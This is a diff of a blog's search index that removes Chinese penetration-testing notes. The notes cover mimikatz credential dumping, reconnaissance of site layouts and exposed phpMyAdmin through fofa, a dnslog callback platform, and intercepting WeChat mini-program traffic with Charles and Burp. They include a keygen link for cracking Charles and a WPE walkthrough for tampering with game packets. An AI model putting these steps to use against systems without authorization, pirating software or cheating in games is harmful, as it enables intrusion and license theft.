-<p>密算法是不可能第一时间就能知道的，而是要对这个站点采取信息收集，收集过后找到对应的架构是怎么样的**(Web站点之间的不同？还是对应想要查看的是某个操作系统？)**，架构知道了，那么这个加密算法具体怎么实现的也就可以通过网上的信息，甚至是自己搭一个这样的站点，对应这些思路自然也就一通百通。</p>
-<p>这里介绍一个工具，mimikatz，它是用于获取windows系统上所有的明文和密钥进行获取。 不过这个不一定有用，因为mimikatz对应在windows2008后版本取消显示明文密码过后，作用并不是那么明显。</p>
-<p>不过从这里可以看出，不管是什么样的架构都有迹可循。</p>
-<p>这样就能防止我们单纯的拿到明文过后却无计可施。 </p>
-<p><strong>不只是有存储类的加密</strong>，<strong>就连代码也会有对应的代码加密</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715205508717.png" alt="image-20240715205508717"></p>
-<p>对应的 数据库也有对应的密文加密方式</p>
-<p>以及浏览器也是对应有其加密方式</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240715211129660.png" alt="image-20240715211129660"></p>
-<p>这些只要掌握大概，以及懂得工具的使用就可以了</p>
-<h1 id="Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="Day5：资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>Day5：资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><p>本阶段复现可能需要基于<strong>阿里云服务器+完整备案后域名+宝塔面板&#x2F;github上自主部署服务。</strong></p>
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZqNyI04OHsCJqTXg5b9F0RmJpBNvbD9ZF0Q&s" alt="关注永雏塔菲谢谢喵什么梗- 抖音"></p>
-<h2 id="资产架构-端口-目录-插件接口-多站点-多应用"><a href="#资产架构-端口-目录-插件接口-多站点-多应用" class="headerlink" title="资产架构-端口&amp;目录&amp;插件接口&amp;多站点&amp;多应用"></a>资产架构-端口&amp;目录&amp;插件接口&amp;多站点&amp;多应用</h2><h3 id="站点结构"><a href="#站点结构" class="headerlink" title="站点结构"></a>站点结构</h3><h4 id="目录型"><a href="#目录型" class="headerlink" title="目录型"></a>目录型</h4><p> 这里由于Satoru前期部署网站和域名备案等琐事，时间线拉长的让人寒心，只能找Wells要了个子域名，所以这里也懒得用我已经部署好的网站重新演示一遍（主要是完整的站点目录我只拿着一个子域名也很难复现（戳手手））</p>
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHNG07AZ4KHRaS7k_YotkiGRnl7kIwbX9hMQ&s" alt="塔菲盒官方下载-永雏塔菲盒(Taffy盒)下载v1.0 安卓版-100手游网"></p>
-<p>这里已经通过域名解析服务器IP，后续宝塔面板一键部署该域名解析的服务器上实现了建站。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717095245678.png" alt="image-20240717095245678"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102335544.png" alt="image-20240717102335544"></p>
-<p>现在只是单独一个网站，那么假设我在对应的域名目录下新建除了这个网站目录之外的博客目录，并在里面部署网站的话，那么这个站点则也会出现在这个域名的目录结构下，那么会呈现的效果也就是这样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102620385.png" alt="image-20240717102620385"></p>
-<p>​					<strong>对应的目录型站点也就成立了</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717102705476.png"></p>
-<p>结构也就显而易见了</p>
-<p><strong>bbs.xiaodi8.com —对应主目录网站</strong> </p>
-<p><strong>bbs.xiaodi8.com&#x2F;blog —wordpress程序</strong></p>
-<p>一个网站，两个程序，作为目录型站点，任何一个程序出现漏洞，都可以进入安全测试</p>
-<h4 id="端口型"><a href="#端口型" class="headerlink" title="端口型"></a>端口型</h4><p>新的网站部署过程中，可以采用对域名bbs.xiaodi8.com额外划出88端口这样的操作，这个时候也是实现了一个网站多个程序的效果</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103213134.png" alt="image-20240717103213134"></p>
-<p>这个其实本质上也不用我额外多说，就是类似这样的结构</p>
-<p><strong>bbs.xiaodi8.com –主网站</strong></p>
-<p><strong>bbs.xiaodi8.com:8081  –wordpress程序</strong></p>
-<h4 id="多个站点"><a href="#多个站点" class="headerlink" title="多个站点"></a>多个站点</h4><p>多个站点类的网站其实原理也比较通俗，就是通过一些子域名实现多程序的部署</p>
-<p>类似这里直接给即将部署的服务额外的域名edu.xiaodi8.com</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717103544082.png" alt="image-20240717103544082"></p>
-<p><strong>对应这两个域名解析都指向服务器IP</strong></p>
-<p><strong>给定目标是bbs.xiaodi8.com 交给你渗透，我们也就可以尝试对服务下 edu.xiaodi8.com进行安全测试。毕竟二者指向IP相同</strong></p>
-<p>这三种网络结构，也给了我们更多的可能性和更多的目标。 </p>
-<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>一般的站长，为了满足网站更多的功能亦或是让自己管理更加方便，可能都会安装一些插件，在安装插件的过程中，如果插件爆出了问题，那么也是会对网站本身造成危害。</p>
-<p>web源码插件</p>
-<p>web应用插件  类似phpmyadmin -设计是便于管理数据库的</p>
-<p>类似的使用fofa就能找到很多部署在公网上的phpmyadmin站点</p>
-<p>对应的fofa站点：<a href="fofa.so">fofa</a></p>
-<p>fofa搜索语法：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717105107703.png" alt="image-20240717105107703"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112530642.png" alt="image-20240717112530642"></p>
-<p><strong>方便了管理者管理数据库，也拓展了攻击者通过这个接口攻击不支持外链数据库的可能性。</strong></p>
-<h3 id="服务器应用"><a href="#服务器应用" class="headerlink" title="服务器应用"></a>服务器应用</h3><p><strong>ftp</strong>  方便管理员进行文件传输操作，也方便攻击者攻击ftp协议服务 比如上传一些后门文件等等</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>电子功能越多，对应的可攻击点越多</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112447372.png" alt="image-20240717112447372"></p>
-<h2 id="番外安全-域名-服务器本身-服务厂商-管理人员"><a href="#番外安全-域名-服务器本身-服务厂商-管理人员" class="headerlink" title="番外安全-域名&amp;服务器本身&amp;服务厂商&amp;管理人员"></a>番外安全-域名&amp;服务器本身&amp;服务厂商&amp;管理人员</h2><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>对于一个由服务器+域名组成的服务：</p>
-<p><strong>假设</strong> </p>
-<p>如果攻击者能够得到阿里云本身的账号密码，那么登录进去就可以进行这个域名的解析管理：</p>
-<p>所以作为攻击者，如果可以收集到对应域名的注册商，对这个域名的使用人员采取社工学的信息收集（直接爆破域名注册平台风险是非常大的，同时对于这种未授权行为是由一套非常严格的管控措施的，所以请读者不要进行一些未授权的行为！如有）</p>
-<h2 id="考虑阻碍-站库分离-CDN-WAP-负载均衡-主机防护"><a href="#考虑阻碍-站库分离-CDN-WAP-负载均衡-主机防护" class="headerlink" title="考虑阻碍-站库分离&amp;CDN&amp;WAP&amp;负载均衡&amp;主机防护"></a>考虑阻碍-站库分离&amp;CDN&amp;WAP&amp;负载均衡&amp;主机防护</h2><h1 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h1>]]></content>
-      <categories>
-        <category>Penetration Testing Basic</category>
-      </categories>
-      <tags>
-        <tag>pr0gram</tag>
       </tags>
   </entry>
   <entry>
@@ -2288,104 +2386,6 @@
 <h1 id="盲打平台"><a href="#盲打平台" class="headerlink" title="盲打平台"></a>盲打平台</h1><p><a href="http://www.dnslog.cn/">www.dnslog.cn</a></p>
 <p>在构造的payload中使被控制服务器访问该平台,如果有回显则证明成功控制.</p>
 <h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://blog.csdn.net/qq_44029310/article/details/125694514">Web—信息收集(非常全)_web info hunter-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing Basic</category>
-      </categories>
-      <tags>
-        <tag>pr0gram</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WX小程序抓包&amp;游戏封包技术</title>
-    <url>/2024/07/14/%E6%89%8B%E6%9C%BA+charles+burpsuite%E9%85%8D%E5%90%88%E6%8A%93%E5%8C%85/</url>
-    <content><![CDATA[<h1 id="微信小程序-公众号抓包的主流方式"><a href="#微信小程序-公众号抓包的主流方式" class="headerlink" title="微信小程序&#x2F;公众号抓包的主流方式"></a>微信小程序&#x2F;公众号抓包的主流方式</h1><p>目前有以下几种：</p>
-<p>1、Windows+Burp+Proxifier（配置困难，数据包卡顿)</p>
-<p>2、Burp+安卓模拟器（模拟器卡顿）</p>
-<p>3、Burp+Charles（本文测试，抓包完整，放包流畅）</p>
-<p>一、下载</p>
-<h4 id="1、Charles官网下载安装包"><a href="#1、Charles官网下载安装包" class="headerlink" title="1、Charles官网下载安装包"></a>1、Charles官网下载安装包</h4><p><a href="https://www.charlesproxy.com/download/latest-release/">https://www.charlesproxy.com/download/latest-release/</a></p>
-<h4 id="2、Burpsuite下载"><a href="#2、Burpsuite下载" class="headerlink" title="2、Burpsuite下载"></a>2、Burpsuite下载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/burp/releases</span><br></pre></td></tr></table></figure>
-
-<h4 id="3、Charles破解"><a href="#3、Charles破解" class="headerlink" title="3、Charles破解"></a>3、Charles破解</h4><p>进入链接，输入任意内容作为用户名，获取注册码。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.zzzmode.com/mytools/charles/</span><br></pre></td></tr></table></figure>
-
-<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
-<p>打开Charles,打开上方工具栏中Help—Register Charles，输入用户名和激活码</p>
-<h3 id="二、Charles设置"><a href="#二、Charles设置" class="headerlink" title="二、Charles设置"></a>二、Charles设置</h3><h4 id="1、Charles设置代理"><a href="#1、Charles设置代理" class="headerlink" title="1、Charles设置代理"></a>1、Charles设置代理</h4><p>打开工具栏中Proxy-Proxy Settings</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d8c24248e8ee40169178ecc42a62836f.png" alt="img"></p>
-<p>设置为如下格式</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/03f1ce83357c4a478a1c23b3a573ef16.png" alt="img"></p>
-<p>然后，抓取包的规则配置（*是代表抓取任意端口和域名，如果只抓取固定的端口or域名可自行设置。）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/60e3b14ad74f45e2af485fd4a1d13c00.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/f844baa2145b4ce182af424db5651b7b.png" alt="img"></p>
-<p>接下来配置Charles代理到burpsuit的规则（我这里偷懒，配置的burp默认的8080端口，为避免端口冲突，可自行想想1-65535之内的端口，与burp协同配置即可）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/57635112886a4064955e578ed29e42b4.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/ee5d8a67623a4979a5b0bbaf772dde94.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41cb4950910e481c8ed2b31f31ed58d8.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4f367272290a44edac26e6f90f6286ea.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4fb4ca3b468a4e32a82bdf13c28f5091.png" alt="img"></p>
-<h4 id="2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）"><a href="#2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）" class="headerlink" title="2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）"></a>2、关闭对windows端的抓包（每次打开软件都是默认开启的，记得关闭）</h4><p>因为主要是联动手机对微信抓包，所以可以关闭windows端的抓包，避免干扰。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/a9aed4740923446fbb449694c92f5a13.png" alt="img"></p>
-<h4 id="3、配置PC端证书"><a href="#3、配置PC端证书" class="headerlink" title="3、配置PC端证书"></a>3、配置PC端证书</h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/b5ef86e515634c1099c51d03f981eae0.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7f39dd9529940e59a8c97313062e2b9.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/e6604a88a8a44b6d9152d69c24520b1e.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/c7750c91696b40e9b555f08b270c0501.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/10cd0da8757444da9fd7ef640f1c2169.png" alt="img"></p>
-<p>点击下一步，再点击完成，PC显示导入完成就完成PC端证书配置了。</p>
-<h4 id="4-移动端证书配置（我这里使用苹果手机测试）"><a href="#4-移动端证书配置（我这里使用苹果手机测试）" class="headerlink" title="4.移动端证书配置（我这里使用苹果手机测试）"></a>4.移动端证书配置（我这里使用苹果手机测试）</h4><p>在这里出现了两种可能性，依次进行即可：</p>
-<h5 id="4-1手机连接电脑热点，并配置端口"><a href="#4-1手机连接电脑热点，并配置端口" class="headerlink" title="4.1手机连接电脑热点，并配置端口"></a>4.1手机连接电脑热点，并配置端口</h5><p>开启电脑热点</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/4c3aea78624043ee81d75414ffa5d693.png" alt="img"></p>
-<p>手机连接热点，然后在Charles中进行如下操作：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/506f55c1d8b843bfaf4eff5c4f57a0e1.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/186401f5edfa444fbb4dcea3daf5b8de.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/d754328f2a1f433a84ca9d9fd52be0f2.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/41b6e5105fac43e8a77eaf56d2d422d6.jpeg" alt="img"></p>
-<h5 id="4-2证书下载后手机能直接识别"><a href="#4-2证书下载后手机能直接识别" class="headerlink" title="4.2证书下载后手机能直接识别"></a>4.2证书下载后手机能直接识别</h5><p>在手机上使用chrome浏览器访问下面这个网址</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chls.pro/ssl</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fcdc424fd5874c5d8af17e280e4dbff4.jpeg" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/64dae3270ca34e04adbefe605f610378.jpeg" alt="img"></p>
-<p>在手机中的设置路径去设置证书：<strong>设置—&gt;通用—&gt;关于本机—&gt;证书信任设置</strong>中打开对根证书启用完全信任。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/7817da8b93ae48c2b33435669110182e.jpeg" alt="img"></p>
-<p>所有的流程配置完成，现在就可以抓包了。</p>
-<p>三、抓包<br>上面配置好了以后就可以开始抓包了，以后如果再有小程序、微信抓包需求直接进行以下流程即可。</p>
-<p>1.打开Charles.</p>
-<p>2.打开burp。on&#x2F;off拦截或者放包。</p>
-<p>3.打开电脑热点，手机连接电脑热点。（如果生活中正常使用电脑热点记得把ip代理改回自动）</p>
-<p>4.手机访问小程序或者公众号，在Charles和burp都可以看到包。</p>
-<h3 id="同样的-我们也可以在模拟器如此部署"><a href="#同样的-我们也可以在模拟器如此部署" class="headerlink" title="同样的　我们也可以在模拟器如此部署"></a>同样的　我们也可以在模拟器如此部署</h3><p><a href="https://blog.csdn.net/weixin_43910861/article/details/123851267">burp+逍遥模拟器 app抓包 （导入证书到系统的解决方案）_逍遥导入证书失败-CSDN博客</a></p>
-<h1 id="游戏封包技术"><a href="#游戏封包技术" class="headerlink" title="游戏封包技术"></a>游戏封包技术</h1><p>第一步：下载所需要的环境</p>
-<p>雷电模拟器</p>
-<p>雷电安卓模拟器-手游模拟器安卓版_android手机模拟器电脑版_雷电模拟器官网</p>
-<p>ProxyDroid</p>
-<p>链接：<a href="https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ">https://pan.baidu.com/s/1F8Yv9aDZuoN3yUgDCOVRBQ</a>     提取码：s4ds </p>
-<p>CCProxy+WPE</p>
-<p>链接: <a href="https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q">https://pan.baidu.com/s/1HxVDuglgsEzXKsDZrSXS1Q</a> 提取码: jti8 </p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704231129143.png" alt="img"></p>
-<p>第二步：代理环境的配置</p>
-<p>首先adb 命令查看自己的ip 在终端输入    ipconfig ,就可以查看到自己的ip, 我这里连接的是wifi,</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222428167.png" alt="img"></p>
-<p>在雷电模拟器上打开安装好的  ProxyDroid.apk  ，将自己的电脑的 ip  填写在 HOST 里面，端口自己设置，不要超过 65535  ，</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/fde7482c47e14fecaf60d1662b38aa16.png" alt="img"></p>
-<p> 设置好 之后  再将上面 这个开关打开</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2ecd9200873346db9206fdb169b8981b.png" alt="img"></p>
-<p>然后 在pc 端打开 CCProxy, 打开设置，端口  是 上面 app  里面填写的端口，IP 和代理app 的保持一直 都是自己电脑上的ip 。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222522362.png" alt="img"></p>
-<p>在点击下面的   高级   ，把ip改成和自己电脑的一至，再点击确定。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222527721.png" alt="img"></p>
-<p>ccproxy 还要开启账户里面的允许所有。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210704230543369.png" alt="img"></p>
-<p>我们再打开模拟器上的游戏，看到ccp 中有这样一条线，就能看到代理成功。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222548577.png" alt="img"></p>
-<p>接下来我们就打开 ，WPE , 在目标程序中找到ccp 的进程。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222608143.png" alt="img"></p>
-<p>在视图里面可以设置 拦截发送的数据包，还是接受到的数据包，我这里只拦截发送的数据包。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/2021060522262510.png" alt="img"></p>
-<p>设置好之后，我们进入游戏，找到游戏的中角色的升级，我们打开wpe, 点击 黑色的运行按钮，我们就能看到扇形的数据包中开始变化，点击一次升级，我们就暂停拦截，我们就取分析，拦截到的数据包，在如下的列表中我们可以很快浏览一下，我们 找到规律了，  </p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222656425.png" alt="img"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/20210605222711573.png" alt="img"></p>
-<p>总结： 我们设置的ip: 172.20.4.153  我们现在就查看，只要来源和目标 ip 都是一样的。这就说明是本地和本地的发送，我们就将这些直接过滤掉， 我们剩下的也不多，就一个一个的试试，</p>
 ]]></content>
       <categories>
         <category>Penetration Testing Basic</category>
